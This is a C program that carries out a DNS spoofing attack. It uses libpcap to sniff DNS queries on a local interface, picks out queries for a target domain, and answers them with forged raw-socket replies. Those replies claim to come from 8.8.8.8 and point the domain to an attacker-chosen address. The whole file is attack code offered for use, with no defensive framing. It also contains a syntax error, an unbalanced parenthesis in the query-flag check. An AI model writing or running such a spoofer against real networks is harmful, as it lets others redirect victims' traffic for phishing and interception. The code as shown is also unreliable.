#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pcap.h>
#include <time.h>

#define FAKE_IP "6.6.6.6"  // Attacker's fake IP
#define SPOOF_DOMAIN "example.com"  // Target domain to spoof

#pragma pack(push, 1)
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};
#pragma pack(pop)

void send_spoofed_dns(const u_char *packet, uint16_t trans_id, struct in_addr src_ip, uint16_t src_port);
void compute_udp_checksum(struct ip *ip_hdr, struct udphdr *udp_hdr, struct dns_header *dns_hdr);
unsigned short checksum(unsigned short *buf, int len);

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct ip *ip_hdr = (struct ip*)(packet + 14); // Skip Ethernet header (14 bytes)
    if (ip_hdr->ip_p != IPPROTO_UDP) return;

    struct udphdr *udp_hdr = (struct udphdr*)((char*)ip_hdr + (ip_hdr->ip_hl << 2));
    if (ntohs(udp_hdr->uh_dport) != 53) return;

    struct dns_header *dns_hdr = (struct dns_header*)((char*)udp_hdr + sizeof(struct udphdr));
    if ((dns_hdr->flags & htons(0x8000)) return; // Skip non-queries

    // Check if the query matches the target domain (simplified for demo)
    char *qname = (char*)(dns_hdr + 1);
    if (strstr(qname, SPOOF_DOMAIN) == NULL) return;

    // Send spoofed response
    send_spoofed_dns(packet, ntohs(dns_hdr->id), ip_hdr->ip_src, udp_hdr->uh_sport);
}

void send_spoofed_dns(const u_char *packet, uint16_t trans_id, struct in_addr src_ip, uint16_t src_port) {
    char buffer[1024];
    memset(buffer, 0, 1024);

    // IP Header
    struct ip *ip_hdr = (struct ip*)buffer;
    ip_hdr->ip_v = 4;
    ip_hdr->ip_hl = 5;
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + sizeof(struct dns_header) + 16);
    ip_hdr->ip_id = htons(54321);
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 255;
    ip_hdr->ip_p = IPPROTO_UDP;
    ip_hdr->ip_src.s_addr = inet_addr("8.8.8.8"); // Spoofed DNS server IP
    ip_hdr->ip_dst = src_ip;
    ip_hdr->ip_sum = checksum((unsigned short*)ip_hdr, sizeof(struct ip));

    // UDP Header
    struct udphdr *udp_hdr = (struct udphdr*)(buffer + sizeof(struct ip));
    udp_hdr->uh_sport = htons(53);
    udp_hdr->uh_dport = src_port;
    udp_hdr->uh_ulen = htons(sizeof(struct udphdr) + sizeof(struct dns_header) + 16);
    udp_hdr->uh_sum = 0;

    // DNS Header
    struct dns_header *dns_hdr = (struct dns_header*)(buffer + sizeof(struct ip) + sizeof(struct udphdr));
    dns_hdr->id = htons(trans_id);
    dns_hdr->flags = htons(0x8180); // QR=1 (Response), RA=1, etc.
    dns_hdr->qdcount = htons(1);
    dns_hdr->ancount = htons(1);
    dns_hdr->nscount = 0;
    dns_hdr->arcount = 0;

    // Question Section (copy from query)
    char *qname = (char*)(dns_hdr + 1);
    strcpy(qname + 1, SPOOF_DOMAIN);
    qname[0] = strlen(SPOOF_DOMAIN);
    char *qtype = qname + strlen(SPOOF_DOMAIN) + 2;
    *(uint16_t*)qtype = htons(1); // Type A
    *(uint16_t*)(qtype + 2) = htons(1); // Class IN

    // Answer Section
    char *ans = qtype + 4;
    ans[0] = 0xC0; // Pointer to domain name (offset 12)
    ans[1] = 0x0C;
    *(uint16_t*)(ans + 2) = htons(1); // Type A
    *(uint16_t*)(ans + 4) = htons(1); // Class IN
    *(uint32_t*)(ans + 6) = htonl(300); // TTL
    *(uint16_t*)(ans + 10) = htons(4); // Data length (IPv4)
    *(uint32_t*)(ans + 12) = inet_addr(FAKE_IP);

    // Compute UDP checksum
    compute_udp_checksum(ip_hdr, udp_hdr, dns_hdr);

    // Send raw packet
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr = src_ip;
    sendto(sock, buffer, ntohs(ip_hdr->ip_len), 0, (struct sockaddr*)&dest, sizeof(dest));
    close(sock);
}

void compute_udp_checksum(struct ip *ip_hdr, struct udphdr *udp_hdr, struct dns_header *dns_hdr) {
    // Pseudo-header for checksum calculation
    struct pseudo_udp {
        uint32_t src;
        uint32_t dst;
        uint8_t zero;
        uint8_t proto;
        uint16_t len;
    } pseudo;

    pseudo.src = ip_hdr->ip_src.s_addr;
    pseudo.dst = ip_hdr->ip_dst.s_addr;
    pseudo.zero = 0;
    pseudo.proto = IPPROTO_UDP;
    pseudo.len = udp_hdr->uh_ulen;

    int total_len = sizeof(pseudo) + ntohs(udp_hdr->uh_ulen);
    char *temp = malloc(total_len);
    memcpy(temp, &pseudo, sizeof(pseudo));
    memcpy(temp + sizeof(pseudo), udp_hdr, ntohs(udp_hdr->uh_ulen));

    udp_hdr->uh_sum = checksum((unsigned short*)temp, total_len);
    free(temp);
}

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
        fprintf(stderr, "Could not open device: %s\n", errbuf);
        return 1;
    }

    struct bpf_program fp;
    char filter_exp[] = "udp dst port 53";
    pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN);
    pcap_setfilter(handle, &fp);

    pcap_loop(handle, -1, got_packet, NULL);
    pcap_close(handle);
    return 0;
}